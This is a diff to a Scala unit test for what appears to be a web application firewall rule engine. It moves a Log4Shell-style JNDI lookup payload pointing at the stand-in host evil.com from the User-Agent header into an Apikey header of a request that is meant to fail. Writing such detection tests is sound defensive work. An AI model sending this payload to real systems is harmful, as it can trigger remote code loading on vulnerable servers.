@@ -134,7 +134,10 @@ class SecLangBasicTest extends munit.FunSuite {
         val failing_ctx = RequestContext(
           method = "GET",
           uri = "/",
-          headers = Map("User-Agent" -> List("${jndi:ldap://evil.com/a}")),
+          headers = Map(
+            "Apikey" -> List("${jndi:ldap://evil.com/a}"),
+            //"User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
+          ),
           query = Map("q" -> List("test")),
           body = None
         )
